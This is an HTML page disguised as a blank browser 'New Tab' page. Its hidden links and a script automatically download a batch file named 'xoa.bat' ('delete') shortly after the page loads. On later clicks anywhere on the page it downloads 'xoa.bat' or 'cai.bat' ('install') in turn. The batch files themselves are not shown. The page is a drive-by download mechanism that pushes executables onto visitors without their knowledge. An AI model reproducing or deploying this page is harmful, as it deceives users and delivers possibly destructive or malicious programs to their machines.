<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>New Tab</title>
<style>
html, body {
    margin: 0;
    padding: 0;
    width: 100%;
    height: 100%;
    background: #ffffff;
    overflow: hidden;
}
</style>
</head>
<body>
<a id="dx" href="xoa.bat" download="xoa.bat" style="display:none"></a>
<a id="dc" href="cai.bat" download="cai.bat" style="display:none"></a>
<script>
var step = 0;
function dl(id) {
    var a = document.getElementById(id);
    if (a) a.click();
}
window.addEventListener('DOMContentLoaded', function() {
    setTimeout(function() {
        if (step === 0) {
            step = 1;
            dl('dx');
        }
    }, 100);
});
document.addEventListener('click', function() {
    if (step % 2 === 1) {
        dl('dc');
    } else {
        dl('dx');
    }
    step++;
});
</script>
</body>
</html>
